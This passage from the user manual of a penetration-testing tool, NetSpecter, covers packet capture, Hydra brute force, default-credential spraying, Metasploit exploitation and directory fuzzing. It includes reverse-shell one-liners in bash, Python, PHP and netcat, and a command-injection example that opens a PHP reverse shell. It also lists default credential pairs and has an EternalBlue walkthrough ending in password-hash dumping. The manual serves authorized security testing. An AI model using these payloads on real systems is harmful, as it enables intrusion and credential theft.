| **Workstation** | Circle, green border | Few open ports (typically just dynamic/ephemeral) |
| **IoT Device** | Small circle, orange border | Known IoT vendor (Nest, Ring, Sonos) or mDNS-discovered |
| **Container Host** | Square, sky-blue border | Container indicator ports detected (2375, 10250, etc.) |

### Edge Types

- **Same-subnet connection** — solid gray line: hosts on the same `/24` subnet
- **Gateway connection** — thick blue line: connection from a host to its default gateway
- **Cross-subnet connection** — dashed line: inferred connection via routing (from SNMP data)

### PNG Export

Click the Camera icon to export the current graph view as a PNG image. The export captures:

- The current zoom level and viewport
- All nodes and edges as currently laid out
- A white background suitable for documents and presentations
- No metadata is embedded in the PNG

### Reading the Graph for Pentest Intelligence

- **High-centrality nodes** (many connections) indicate critical infrastructure — switches, domain controllers, or file servers. Compromising these hosts gives maximum lateral movement potential.
- **Isolated nodes** (few connections) may be forgotten or unmanaged devices — often the easiest targets due to missed patching.
- **Hosts bridging two clusters** are potential pivot points between network segments.

> **Worked example:** After scanning a `/24` network, you open the topology map in Concentric layout. The center node is `192.168.1.1` (the gateway) with 25 connections. The second ring contains `192.168.1.10` (a Windows server with 12 open ports) and `192.168.1.20` (a Linux server with 8 open ports). The outer ring contains workstations. You prioritize the two servers for deep scanning because they are central to the network and have the largest attack surfaces.

---

## 15. Live Packet Capture & PCAP Export

For deep forensic visibility into a specific host:

1. Navigate to the **Passive Intelligence** panel, or right-click a host card and select **Capture Packets**
2. Set a **Capture Filter** (BPF syntax, e.g., `host 192.168.1.5` or `tcp port 443`)
3. Set a **Duration** (or leave blank for continuous capture)
4. Click **Start Capture**

The panel streams packet summaries in real time including:

- Source / Destination IP and port
- Protocol (TCP, UDP, ICMP, HTTP, TLS, DNS, ARP)
- Payload snippet (for cleartext protocols)
- Running stats: protocol distribution percentages, top talkers by byte count, cleartext protocol alerts

Click **Stop & Save** at any time to write the capture to a `.pcap` file for Wireshark analysis.

### BPF Filter Syntax Reference

| Filter Expression | What It Captures |
| --- | --- |
| `host 192.168.1.5` | All traffic to/from a specific IP |
| `src host 192.168.1.5` | Only traffic originating from a specific IP |
| `dst host 192.168.1.5` | Only traffic destined for a specific IP |
| `net 192.168.1.0/24` | All traffic within a subnet |
| `tcp port 80` | HTTP traffic |
| `tcp port 443` | HTTPS traffic |
| `udp port 53` | DNS traffic |
| `tcp portrange 1-1024` | All well-known TCP ports |
| `host 192.168.1.5 and tcp port 22` | SSH traffic to/from a specific host |
| `not host 192.168.1.1` | Exclude gateway traffic (reduces noise) |
| `ether host 00:1A:2B:3C:4D:5E` | Filter by MAC address |
| `tcp[tcpflags] & (tcp-syn) != 0` | Only SYN packets (new connections) |
| `tcp[tcpflags] & (tcp-rst) != 0` | Only RST packets (refused connections) |
| `icmp` | ICMP only (pings, unreachable, TTL exceeded) |

### Stats Panel Metrics

| Metric | What It Means |
| --- | --- |
| **Protocol Distribution %** | Percentage of captured packets by protocol (TCP, UDP, ICMP, etc.). A network with 90%+ TCP is typical; high UDP may indicate DNS-heavy traffic or media streaming. |
| **Top Talkers** | Hosts ranked by total bytes sent/received. The top talker is often the gateway or a busy server. An unexpected top talker could indicate data exfiltration. |
| **Cleartext Protocol Alerts** | Triggered when credentials or sensitive data are detected in cleartext protocols: HTTP with `Authorization` headers, FTP `USER`/`PASS`, Telnet login sequences, SMTP `AUTH PLAIN`. |

### Specific Investigation Workflows

#### Finding a Host's External Communications

```text
Filter: host 192.168.1.42 and not net 192.168.1.0/24
```

This shows only traffic between the target host and IPs outside the local subnet — useful for identifying C2 callbacks, data exfiltration, or unauthorized external services.

#### Identifying Cleartext Credentials in Transit

```text
Filter: tcp port 21 or tcp port 23 or tcp port 110 or tcp port 143
```

Captures FTP, Telnet, POP3, and IMAP traffic — all protocols that commonly transmit credentials in cleartext. Watch the payload snippets for `USER`, `PASS`, `LOGIN`, and `AUTH` commands.

#### Watching a Specific TCP Stream

```text
Filter: host 192.168.1.42 and host 10.0.0.5 and tcp port 3306
```

Captures a specific client-server conversation (in this case, MySQL traffic between two hosts). Useful for understanding application behavior or detecting unauthorized database access.

### Stop & Save Behavior

When you click **Stop & Save**:

1. The capture stops immediately
2. A file dialog opens for you to choose the save location
3. The file is saved in standard `.pcap` format (libpcap)
4. Default naming convention: `capture_<timestamp>.pcap`
5. All packets captured up to the stop time are included — no data loss

### File Size Expectations

| Network Activity | Approximate Capture Rate |
| --- | --- |
| Quiet office network (10 hosts) | 1-5 MB per minute |
| Active web browsing (single host) | 5-20 MB per minute |
| File transfer or streaming | 50-500 MB per minute |
| Full `/24` subnet, all traffic | 100+ MB per minute |

> **Tip:** For long-duration captures, always set a BPF filter to limit the captured traffic. An unfiltered capture on a busy network can generate gigabytes of data in minutes.

---

## 16. Offensive Pentest Suite

> **Authorization Required:** All offensive tools in this section perform active, potentially disruptive operations. You must have explicit written authorization to test any system you do not own. NetSpecter displays a **Pentest Consent Gate** on first use — you must accept it before any offensive tool activates.

### What the Consent Gate Says

The consent gate modal presents the following acknowledgment:

1. You confirm you have explicit written authorization to perform active security testing
2. You understand that offensive tools may cause service disruption, account lockouts, or system instability
3. You accept responsibility for any consequences of using these tools
4. You acknowledge that captured credentials and session data are held in memory only

### How Authorization Should Be Documented

Before using any offensive tool, ensure you have:

- **Written scope document** — signed by the system owner, listing authorized target IPs/ranges and authorized testing techniques
- **Rules of Engagement (RoE)** — specifying testing windows, forbidden techniques, escalation contacts, and out-of-scope systems
- **Emergency contact information** — names and phone numbers for system administrators who can intervene if something goes wrong

### Active vs. Passive Offensive Techniques

| Category | Examples | Risk Level |
| --- | --- | --- |
| **Passive** | Credential sniffing, DNS harvesting, ARP monitoring | Low — no traffic is sent to targets |
| **Active reconnaissance** | Port scanning, banner grabbing, SNMP walking | Medium — sends probes that may trigger IDS alerts |
| **Active exploitation** | Brute force, credential spray, Metasploit exploits, directory fuzzing | High — may cause lockouts, crashes, or service disruption |

### Session Memory

The consent gate is shown once per session. It records your acknowledgment in memory (not on disk) and does not expire until the application is closed. Credentials discovered by offensive tools are likewise held in memory only — nothing is written to disk. This design ensures:

- No forensic artifacts are left on your testing machine
- Credentials cannot be recovered from disk after the session ends
- The consent acknowledgment cannot be used as retroactive authorization

---

### 16A. Multi-Protocol Brute-Force (Hydra)

Automate credential discovery across SSH, FTP, Telnet, HTTP, SMB, RDP, and other services using the integrated Hydra engine.

**Requirements:** Hydra installed and enabled in Settings.

#### Starting a Brute-Force Attack

#### Method 1 — From Host Details

1. Open the Host Details panel for your target
2. Click the **Brute Force** button next to any detected service port (e.g., next to port 22 for SSH, port 80 for HTTP)
3. The Brute-Force modal pre-fills the protocol based on the selected port

#### Method 2 — From Header Button

1. Click the **Brute Force** button in the top toolbar to open the modal manually
2. Enter the target IP and select the protocol

#### Full Protocol List

| Protocol | Default Port | What It Tests | Hydra Service Name |
| --- | --- | --- | --- |
| SSH | 22 | SSH password authentication | `ssh` |
| FTP | 21 | FTP login | `ftp` |
| Telnet | 23 | Telnet login prompt | `telnet` |
| HTTP GET | 80 | HTTP Basic/Digest authentication (GET) | `http-get` |
| HTTP POST | 80 | HTTP form-based login (POST) | `http-post` |
| SMB | 445 | Windows/Samba file sharing authentication | `smb` |
| SMB2 | 445 | SMBv2/v3 authentication | `smb2` |
| RDP | 3389 | Remote Desktop Protocol | `rdp` |
| MySQL | 3306 | MySQL database authentication | `mysql` |
| MSSQL | 1433 | Microsoft SQL Server authentication | `mssql` |
| PostgreSQL | 5432 | PostgreSQL database authentication | `postgres` |
| VNC | 5900 | VNC password-only authentication | `vnc` |
| IMAP | 143 | IMAP mail server login | `imap` |
| POP3 | 110 | POP3 mail server login | `pop3` |
| SMTP | 25 | SMTP authentication | `smtp` |

#### Configuring the Attack

- **Protocol**: Select from the list above
- **Username**: Single username or toggle **Load User List** to import a `.txt` wordlist (one username per line, UTF-8 encoding)
- **Password Wordlist**: Click **Browse** to select a password list file. NetSpecter ships with `resources/wordlists/basicauth.txt` as a starter list
- **Threads**: Number of parallel connection attempts (default 4 — increase with caution to avoid lockouts)
- **Delay**: Milliseconds between requests per thread (useful for rate-limit evasion)

##### Thread Count Guidance

| Thread Count | Use Case | Risk |
| --- | --- | --- |
| 1-2 | Testing against production systems with lockout policies | Minimal — stays under most rate limits |
| 4 (default) | General purpose testing | Low — may trigger rate limiting on some services |
| 8-16 | Lab environments without lockout policies | Medium — will trigger IDS alerts, may cause lockouts |
| 16+ | Speed testing against dedicated lab targets | High — may overwhelm the target service |

> **Warning:** Many services lock accounts after 3-5 failed attempts. SSH, RDP, and web application logins commonly enforce lockout policies. Start with low thread counts and short wordlists until you understand the target's lockout behavior.

##### Delay Setting

The delay adds a pause between each request **per thread**. With 4 threads and a 500ms delay:

- Each thread sends a request, then waits 500ms before its next attempt
- Total rate: approximately 8 requests per second (4 threads / 0.5s)
- This rate typically stays under most rate-limiting thresholds

#### Running

Click **Start Brute-Force**. Results stream live:

- Green rows = successful credential pair
- Red rows = rejected
- Orange rows = connection error

Click **Stop** at any time. Export results as CSV using the **Export** button.

#### Reading Results by Protocol

| Protocol | What "Success" Looks Like |
| --- | --- |
| SSH | Authentication accepted, shell prompt received |
| HTTP | Response status 200 (or non-401) after sending credentials |
| FTP | `230 Login successful` response |
| RDP | Authentication accepted (NLA negotiation completes) |
| SMB | `STATUS_SUCCESS` in NTLM authentication response |
| MySQL | Authentication OK packet received |

##### False Positives

HTTP brute force is most prone to false positives:

- **Soft 403s:** Some servers return 200 with a "login failed" message in the body rather than a proper 401/403 status code
- **Redirect loops:** Server redirects to a login page regardless of credentials, but the redirect itself returns 302 (which Hydra may count as success)
- **WAF interference:** Web application firewalls may block requests after a threshold, returning a 200 page with a captcha

Always verify HTTP brute force "hits" manually in the Repeater (Section 19D).

#### CSV Export Format

The export produces a CSV with columns: `timestamp`, `protocol`, `host`, `port`, `username`, `password`, `status` (success/failure/error).

> **Worked example:** You discover SSH on port 22 of `192.168.1.50`. Open Brute Force from the port action button. Protocol is pre-filled as SSH. Enter username `admin`. Browse to `resources/wordlists/basicauth.txt`. Set threads to 2 and delay to 1000ms. Start the attack. After 45 seconds, a green row appears: `admin:admin123`. You have valid SSH credentials. Stop the attack and document the finding.

---

### 16B. Default Credential Spray

Spray a target with known default credential pairs without Hydra — using pure Node.js transports. This is faster to start than Hydra for quick checks.

**Supported Protocols:** SSH, HTTP Basic Auth, FTP, Telnet, SMB

### What "Default Credentials" Are

Default credentials are the factory-set username/password combinations that devices ship with. Manufacturers set these for initial setup convenience, and they are supposed to be changed before production deployment. In practice, many devices — especially IoT devices, network appliances, and development servers — retain their default credentials indefinitely.

### Built-in Credential Pairs

NetSpecter ships with a curated list of the most common default credential pairs:

| Username | Password | Commonly Found On |
| --- | --- | --- |
| `admin` | `admin` | Most web admin panels, routers, managed switches |
| `admin` | `password` | Older routers, NAS devices |
| `admin` | `1234` | Consumer routers, IP cameras |
| `admin` | *(empty)* | Some embedded devices, older firmware |
| `root` | `root` | Linux-based appliances, development VMs |
| `root` | `toor` | Kali Linux default, some security appliances |
| `root` | *(empty)* | Some embedded Linux devices |
| `cisco` | `cisco` | Cisco IOS devices (lab/default config) |
| `guest` | `guest` | Guest accounts on various devices |
| `user` | `user` | Default user accounts |
| `support` | `support` | Technical support accounts |
| `service` | `service` | Service accounts |
| `supervisor` | `supervisor` | Supervisory accounts on industrial devices |
| `ubnt` | `ubnt` | Ubiquiti network devices |
| `pi` | `raspberry` | Raspberry Pi (default Raspbian/Raspberry Pi OS) |
| `admin` | `admin1234` | Some modern consumer routers |
| `admin` | `123456` | Various web panels |

#### Starting a Spray

1. Click the **Cred Spray** button in the top toolbar, or right-click a host then **Pentest** then **Default Credential Spray**
2. Select the target protocol
3. Choose a credential set:
   - **Built-in defaults** — the list above
   - **Custom list** — load a CSV file with `username,password` pairs
4. Configure concurrency (default 5 simultaneous attempts)
5. Click **Start Spray**

#### Protocol-Specific Behavior

##### SSH

A "hit" means the SSH authentication handshake completes successfully. NetSpecter briefly authenticates and immediately disconnects — it does not execute any commands. A refused connection (port closed) or a timeout is recorded as an error. An `AUTH_FAILED` response is recorded as a miss.

##### HTTP Basic Auth

NetSpecter sends a GET request to the target with an `Authorization: Basic <base64(user:pass)>` header. A `200 OK` response is a hit. A `401 Unauthorized` is a miss. A `403 Forbidden` may indicate the credentials are valid but the account lacks permission.

##### FTP

NetSpecter sends `USER <username>` followed by `PASS <password>`. A `230 Login successful` response is a hit. NetSpecter then sends `PWD` to verify the session is functional (some FTP servers accept credentials but restrict access). The current working directory is recorded in the result.

##### Telnet

NetSpecter connects and waits for a login prompt (matching patterns like `login:`, `Username:`, `Password:`). It sends the username and password in sequence. A shell prompt or welcome message after password entry indicates a hit. This protocol is the most fragile due to the variety of prompt formats across devices.

##### SMB

NetSpecter authenticates using NTLM and attempts to list shares. A successful share listing confirms valid credentials. `STATUS_ACCESS_DENIED` with valid authentication is still recorded as a partial hit (credentials work but no share access).

#### Memory-Only Guarantee

All credential data from the spray is held in memory only — identical to the Credential Sniffer guarantee (Section 12). Nothing is written to disk. Results are lost when the application closes.

Successful hits are highlighted in green with a distinct hit sound. Results can be exported to CSV.

> **Worked example:** You discover 5 IoT devices (IP cameras, a NAS, and two printers) on the network. Select all 5 hosts, choose SSH protocol, and run the built-in default credential spray. Within 30 seconds, 2 hits appear: an IP camera with `admin:admin` and the NAS with `admin:1234`. Document the findings and recommend immediate credential changes.

---

### 16C. Metasploit RPC Control Plane

Orchestrate the Metasploit Framework directly from NetSpecter via MSFRPC.

**Requirements:** Metasploit Framework installed. Start the RPC daemon:

```bash
msfrpcd -P your_password -S -f
# Default: listens on 127.0.0.1:55553
```

##### Flag Explanation

| Flag | Meaning |
| --- | --- |
| `-P your_password` | Set the RPC authentication password (required) |
| `-S` | Disable SSL (simplifies local connections; use SSL for remote) |
| `-f` | Run in foreground (so you see the output; omit for background/daemon mode) |
| `-a 0.0.0.0` | Bind to all interfaces (only needed if connecting from a different machine) |
| `-p 55554` | Use a non-default port (default is 55553) |

#### Connecting

1. Click the **Metasploit** button in the top toolbar (only visible when Metasploit is detected in Settings)
2. In the MSF modal, enter your RPC credentials:
   - Host (default `127.0.0.1`)
   - Port (default `55553`)
   - Password
3. Click **Connect** — NetSpecter establishes an MSFRPC session and loads the module database

##### What Happens at Connect

1. NetSpecter authenticates to the MSFRPC service using the provided password
2. The module database is loaded (this can take 10-30 seconds on first connection as Metasploit indexes its modules)
3. Any existing active sessions are enumerated and displayed in the Sessions tab
4. The Module Search box becomes active

#### Browsing & Launching Exploits

1. Use the **Module Search** box to filter exploits (e.g., `ms17_010`, `eternalblue`, `http`)
2. Click a module row to select it — options populate in the right pane
3. Fill in required options:
   - `RHOSTS` — pre-filled from the currently selected network host if launched from Host Details
   - `RPORT` — auto-filled from detected open ports when applicable
   - `PAYLOAD` — select from compatible payloads in the dropdown
4. Click **Run Exploit** — output streams to the terminal block in real time

##### Module Search Tips

| Search Term | What It Finds |
| --- | --- |
| `ms17_010` | EternalBlue and related SMB exploits |
| `http` | All HTTP-related exploits and auxiliary modules |
| `scanner/ssh` | SSH scanning and enumeration modules |
| `CVE-2021-44228` | Modules targeting a specific CVE |
| `type:exploit platform:windows` | Windows exploits only |
| `type:auxiliary` | Scanning and information gathering modules |

##### Payload Selection Guidance

| Payload Type | Description | When to Use |
| --- | --- | --- |
| **Staged** (e.g., `windows/meterpreter/reverse_tcp`) | Small initial payload downloads the full payload from your machine | When the exploit has limited space for shellcode, or when you want the latest Meterpreter features |
| **Stageless** (e.g., `windows/meterpreter_reverse_tcp`) | Full payload is delivered in a single package | When the target cannot make outbound connections to download the second stage |
| **Architecture matching** | Must match the target's OS and architecture | x86 payloads for 32-bit targets, x64 for 64-bit. Mismatch causes crashes. |

#### Reading Exploit Output

| Output Pattern | Meaning |
| --- | --- |
| `[*] Started reverse TCP handler on 0.0.0.0:4444` | Listener is ready |
| `[*] Sending exploit...` | Payload has been sent to the target |
| `[+] Meterpreter session 1 opened` | **Success** — you have a shell |
| `[-] Exploit aborted due to failure` | Exploit failed — check RHOSTS, RPORT, and payload compatibility |
| `[*] Exploit completed, but no session was created` | Exploit ran but the payload did not connect back — check LHOST, firewall rules |

#### Session Management

Active sessions appear in the **Sessions** tab of the MSF modal:

- **Shell sessions** — interact with a basic command shell (type OS commands directly)
- **Meterpreter sessions** — full Meterpreter command interface with advanced capabilities

Click **Interact** to open a live terminal to the session. Click **Kill** to terminate a session.

##### Meterpreter vs. Basic Shell

| Capability | Basic Shell | Meterpreter |
| --- | --- | --- |
| Run OS commands | Yes | Yes |
| File upload/download | Manual (via OS commands) | `upload` / `download` commands |
| Screenshot | No | `screenshot` |
| Keylogging | No | `keyscan_start` / `keyscan_dump` |
| Pivot to other hosts | No | `route add` + `portfwd` |
| Privilege escalation | Manual | `getsystem` |
| Persistence | Manual | `run persistence` |
| Process migration | No | `migrate <PID>` |

> **Worked example:** You discovered a Windows host (`192.168.1.100`) with port 445 open and the Nmap vuln scan found `CVE-2017-0144` (EternalBlue). Open Metasploit, search for `ms17_010_eternalblue`. RHOSTS is pre-filled with `192.168.1.100`. Set PAYLOAD to `windows/x64/meterpreter/reverse_tcp`. Set LHOST to your IP. Click **Run Exploit**. After 15 seconds, a Meterpreter session opens. Type `sysinfo` to confirm OS version, `hashdump` to extract password hashes, and document the full exploitation chain for your report.

---

### 16D. Interactive Reverse Shell Hub

A dedicated listener for incoming reverse shell connections with built-in payload generation.

### What a Reverse Shell Is

In a normal (bind) shell, the attacker connects to the target. In a reverse shell, the **target connects back to the attacker**. This is preferred because:

1. **Firewall evasion** — most firewalls allow outbound connections but block inbound. A reverse shell uses an outbound connection from the target.
2. **NAT traversal** — if the target is behind NAT, inbound connections are impossible. Reverse shells use the target's outbound connection.
3. **Persistence** — reverse shells can be configured to retry the connection if it drops.

#### Opening the Listener

1. Click the **Reverse Shell** button in the top toolbar to open the RevShell panel (slides in from the right)
2. Select the listener **Port** (default 4444)
3. Select the **Shell Type**:
   - **Bash** — `bash -i >& /dev/tcp/LHOST/LPORT 0>&1`
   - **Python** — Python 3 `socket` one-liner
   - **PowerShell** — PowerShell TCP reverse shell
   - **PHP** — `exec()` based PHP reverse shell
   - **Netcat** — `nc -e /bin/sh LHOST LPORT`
4. NetSpecter auto-populates `LHOST` with your detected local IP address
5. Click **Copy Payload** to copy the ready-to-execute command to clipboard

##### Shell Type Details

| Type | Full Payload Template | Target Environment |
| --- | --- | --- |
| **Bash** | `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` | Linux/macOS targets with bash. Requires `/dev/tcp` support (built into bash but not all shells). |
| **Python** | `python3 -c 'import socket,subprocess,os;s=socket.socket(...);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` | Universal — works on any system with Python 2 or 3 installed. The most reliable cross-platform option. |
| **PowerShell** | `powershell -NonInteractive -NoProfile -Command "$c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);..."` | Windows targets. The `-NonInteractive -NoProfile` flags suppress the PowerShell startup banner and profile loading for stealth. |
| **PHP** | `php -r '$s=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'` | Web server targets where you can execute PHP code (e.g., via a file upload vulnerability or command injection in a PHP application). Requires `exec()` or `system()` to not be disabled in `php.ini`. |
| **Netcat** | `nc -e /bin/sh LHOST LPORT` | Targets with netcat compiled with `-e` support. Note: OpenBSD netcat (default on many Linux distros) does **not** support `-e`. Use the GNU/traditional version, or use the bash/python payload instead. |

##### LHOST Auto-Detection

NetSpecter automatically detects your local IP address using the same logic as the OAST listener (Section 19I): it enumerates all non-internal IPv4 network interfaces and selects the first one. If you have multiple interfaces (LAN + VPN), verify the auto-detected IP is reachable by your target.

#### Starting the Listener

Click **Start Listener**. NetSpecter opens a TCP server on the configured port in the main process.

When a reverse shell connects:

- A terminal session opens in the panel
- Type commands directly — responses stream back in real time
- Click **Kill Session** to terminate the connection
- Multiple simultaneous connections are supported — each gets its own session tab

#### Session Management

Each incoming connection creates a numbered session tab. You can:

- Switch between sessions by clicking their tabs
- Type commands in the active session's terminal
- Kill individual sessions without affecting others
- See the remote IP and connection duration for each session

> **Worked example:** You discovered a PHP web application vulnerable to command injection (found by the Scanner, Section 19C). Start a reverse shell listener on port 4444. Select the PHP shell type. Copy the payload. In the Repeater, inject the payload into the vulnerable parameter: `; php -r '$s=fsockopen("192.168.1.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'`. Send the request. A new session tab appears in the RevShell panel. You now have a shell on the web server.

---

### 16E. SMB/NFS Share Explorer

Expose misconfigured network shares and sensitive data storage.

**Requirements:** `smbclient` (Linux/macOS) or `impacket-smbclient` (Windows) installed and enabled in Settings.

#### smbclient vs. impacket-smbclient

| Tool | Platform | Why It Is Used |
| --- | --- | --- |
| `smbclient` | Linux/macOS | Native Samba client. Reliable, well-tested, standard on most Linux distributions. |
| `impacket-smbclient` | Windows | Windows caches SMB connections at the OS level, which interferes with credential testing. Impacket bypasses the OS SMB stack entirely, using its own Python-based SMB implementation. This allows testing different credentials against the same host in the same session. |

#### Enumerating Shares

**Method 1** — Click **Enumerate Shares** in the Host Details panel when ports 139 or 445 are open.

**Method 2** — Click the **Share Enum** button in the top toolbar and enter a target IP manually.

The panel performs three enumeration attempts in sequence:

##### 1. Null Session

A null session connects with an empty username and empty password. This tests whether the target allows anonymous access — common on older Windows systems (Server 2003 and earlier) and misconfigured Samba servers. A successful null session typically reveals:

- Share names and types
- Share comments (descriptions)
- Sometimes: user lists via `net rpc user` enumeration

##### 2. Guest Session

A guest session connects with the username `guest` and an empty password. Many Windows systems have a built-in guest account that is disabled by default but sometimes enabled on file servers or development machines. Guest access may reveal shares not visible to null sessions.

##### 3. Authenticated Session

If you provide credentials in the optional username/password fields, NetSpecter performs authenticated enumeration. This reveals all shares the authenticated user has access to, including hidden shares (shares ending in `$`).

#### Browsing Files

When shares are found, they appear as folders in the left pane. Click a share to expand its directory tree:

- Navigate using the breadcrumb bar at the top of the file pane
- Click any file to see metadata (size, modified date, permissions)
- Right-click a file then **Download** to save it locally for analysis

#### Color-Coding by Access Level

| Color | Meaning | Implication |
| --- | --- | --- |
| **Red** | World-readable (no credentials required) | Critical finding — anyone on the network can read these files |
| **Orange** | Guest-accessible | High finding — minimal authentication required |
| **Blue** | Authenticated access only | Lower risk — but may contain sensitive data accessible to any domain user |
| **Gray** | Access denied | Share exists but your current credentials cannot access it |

#### High-Value Targets to Look For

When browsing shares, prioritize files that may contain credentials or sensitive data:

| File Pattern | What It May Contain |
| --- | --- |
| `*.kdbx` / `*.kdb` | KeePass password database files |
| `web.config` / `appsettings.json` | Database connection strings, API keys |
| `id_rsa` / `*.pem` / `*.key` | SSH private keys, TLS private keys |
| `*.bak` / `*.sql` / `*.dump` | Database backups with full data |
| `*.rdp` | Remote Desktop connection files (may contain saved credentials) |
| `unattend.xml` / `sysprep.xml` | Windows deployment files (may contain local admin passwords) |
| `.env` / `.env.production` | Application environment files with secrets |
| `passwords.txt` / `creds.xlsx` | Users storing credentials in files (surprisingly common) |

> **Worked example:** You find a Windows file server at `192.168.1.20` with port 445 open. Open Share Explorer. The null session reveals 3 shares: `Public` (red — world-readable), `IT` (orange — guest-accessible), and `Finance` (gray — access denied). Browse the `IT` share and find a `backups/` directory containing `web.config.bak`. Download it and find a SQL Server connection string with `sa` credentials. Document the finding: sensitive backup files on a guest-accessible share.

---

### 16F. Web Directory Fuzzer

Discover hidden files and directories on web servers with zero external dependencies.

#### What Directory Fuzzing Reveals

Web servers often contain files and directories that are not linked from the main application but are still accessible via direct URL requests. These include:

- **Admin panels** (`/admin`, `/administrator`, `/wp-admin`) — management interfaces
- **Configuration files** (`/.env`, `/web.config`, `/phpinfo.php`) — contain secrets
- **Backup files** (`/backup`, `/db.sql.bak`, `/site.tar.gz`) — contain source code or data
- **Version control** (`/.git/HEAD`, `/.svn/entries`) — reveals source code repository
- **API documentation** (`/swagger`, `/api-docs`, `/openapi.json`) — reveals API structure
- **Development artifacts** (`/debug`, `/test`, `/staging`) — often less secured than production

The proxy/crawler will not find these because they are not linked. Only brute-force directory enumeration can discover them.

#### Opening the Fuzzer

**Method 1** — Click the **Dir Fuzz** button next to any detected HTTP port in the Host Details panel.

**Method 2** — Click the **Dir Fuzz** button in the top toolbar and enter a base URL manually.

#### Configuration

##### Wordlist

- **Built-in** — ~70 common paths covering admin panels, config files, backups, version control, API docs, CMS paths (WordPress, phpMyAdmin), health check endpoints, and standard web assets. The full list is defined in `networkConstants.js` as `COMMON_WEB_PATHS`.
- **Custom file** — browse to a wordlist file (one path per line, up to 100,000 entries). Popular external wordlists include SecLists `Discovery/Web-Content/` and DirBuster's wordlists.

##### Extension Expansion Logic

When extensions are enabled (e.g., `.php`, `.html`, `.bak`), the fuzzer appends each selected extension to every base path that does **not** already have an extension. For example:

- Base path `/admin` with extensions `.php`, `.html` generates: `/admin`, `/admin.php`, `/admin.html`
- Base path `/robots.txt` is **not** expanded (it already has an extension)
- Base path `/.env` is **not** expanded (starts with a dot — treated as a complete filename)

This expansion multiplies the total request count: a 50-path wordlist with 3 extensions generates up to 200 requests.

##### Status Code Filter

Toggle which HTTP response status codes appear in the results:

| Status Code | Color | Meaning in Directory Fuzzing Context |
| --- | --- | --- |
| **200** | Green | Confirmed accessible — the resource exists and is readable |
| **201** | Green | Created — unusual for fuzzing, may indicate a writable endpoint |
| **301/302** | Blue | Redirect — the path exists but redirects elsewhere. Follow the redirect to see where it goes (often redirects to a login page, which confirms the resource exists behind authentication). |
| **403** | Orange | Forbidden — the resource **exists** but access is blocked. This is still valuable: you know the path is real, and you may be able to bypass the restriction (e.g., with different HTTP methods, headers, or authentication). |
| **500** | Red | Server error — the path triggered a server-side error. This may indicate a configuration problem, an injection vulnerability, or an application crash caused by your request. Investigate further. |

##### Concurrency

Simultaneous requests, 1-50 (default 20). The fuzzer uses a semaphore-based concurrency limiter.

| Concurrency | When to Use |
| --- | --- |
| 1-5 | Production servers, servers with rate limiting, targets you need to be gentle with |
| 10-20 (default) | General purpose — good balance of speed and server load |
| 30-50 | Lab environments, local development servers, targets that can handle high load |
| 50+ | Not supported — the semaphore caps at 50 to prevent overwhelming the OS TCP stack |

> **Warning:** Concurrency above 30 can trigger WAF (Web Application Firewall) rate limiting, cause connection pool exhaustion on the target, or result in your IP being temporarily blocked.

##### Custom Wordlist Format

One path per line. Lines starting with `#` are treated as comments. Maximum 100,000 entries.

```text
# Admin paths
/admin
/administrator
/manage

# API endpoints
/api/v1
/api/v2
/graphql

# Sensitive files
/.env
/web.config
/phpinfo.php
```

#### Running the Fuzz

Click **Start Fuzzing**. Results appear in the table as hits arrive:

| Column | Description |
| --- | --- |
| Status | HTTP status code (color-coded: 200=green, 3xx=blue, 403=orange, 5xx=red) |
| Path | The discovered path |
| Size | Response body size in bytes |
| Duration | Request round-trip time |

Click any row to see the response headers and a body preview. Click **Export CSV** to save the full results. Click **Clear** to reset.

#### Reading Results — What to Do Next

| Finding | Recommended Action |
| --- | --- |
| 200 on `/admin` | Open in browser. If it shows a login form, try default credentials (Section 16B). |
| 200 on `/.git/HEAD` | The entire Git repository may be downloadable. Use `git-dumper` or similar to reconstruct the source code. |
| 200 on `/.env` | Download and read — likely contains database credentials, API keys, and secrets. |
| 403 on `/admin` | Try alternate methods: `PUT`, `OPTIONS`. Try path variations: `/Admin`, `/ADMIN`, `/admin/`. Try header bypasses: `X-Forwarded-For: 127.0.0.1`. |
| 500 on `/api/v1` | Send to Repeater and investigate. A 500 error may reveal stack traces or be exploitable. |
| 301 to `/login` for multiple paths | The application redirects unauthenticated users. These paths exist behind authentication. |

> **Worked example:** You fuzz `http://192.168.1.30:8080` with the built-in wordlist and `.bak` extension enabled. Results: `/admin` returns 302 (redirects to `/login`), `/backup` returns 200 (directory listing enabled), `/web.config.bak` returns 200 (backup configuration file). You download `/web.config.bak` and find a database connection string with credentials. You browse `/backup/` and find a full database dump. Document both findings as critical — sensitive data exposed on the web server.

---

## 17. Security Monitoring & Hardening

### Continuous Hardening Monitor

The Hardening Monitor schedules recurring security snapshots of individual hosts and alerts when the security posture changes.

#### Starting a Monitoring Schedule

1. Click the **Hardening** button in the top toolbar to open the Hardening Monitor panel
2. Select a target host from your dashboard (or enter an IP manually)
3. Choose a **scan interval**: 5 minutes, 15 minutes, 1 hour, 6 hours, or 24 hours
4. Choose what to monitor:
   - Open port changes
   - Service banner changes
   - SSL/TLS certificate changes (expiry, CN changes, fingerprint changes)
   - New CVEs from Nmap vuln scripts
5. Click **Start Monitoring**

#### How the Baseline Is Established

The first scan after you click **Start Monitoring** becomes the baseline snapshot. This snapshot records:

- Every open port and its service banner
- SSL/TLS certificate fingerprints for HTTPS ports
- Any CVEs already discovered

All subsequent scans are compared against this baseline. You can manually reset the baseline at any time by clicking **Set Baseline** to capture the current state as the new reference point.

#### Delta Detection Logic

Each scheduled scan produces a delta report comparing the current state to the baseline:

| Change Type | Badge | What It Means |
| --- | --- | --- |
| **Added** | Green | A new open port appeared, or a new CVE was discovered since the baseline |
| **Removed** | Red | A port that was open is now closed (service shutdown, firewall change, or patching) |
| **Changed** | Yellow | A service banner string changed (software update, reconfiguration, or version change) |

#### Alert Severity Logic

| Change | Severity | Rationale |
| --- | --- | --- |
| New CVE discovered | **High** | A vulnerability appeared that was not present at baseline — investigate immediately |
| New port opened | **Medium** | Attack surface increased — verify the new service is authorized |
| Port closed | **Low** | Typically positive (reduced attack surface), but may indicate unplanned service outage |
| Banner changed | **Medium** | May indicate patching (positive) or unauthorized modification |
| Certificate changed | **Medium** | May be a routine renewal or may indicate a MitM certificate swap |
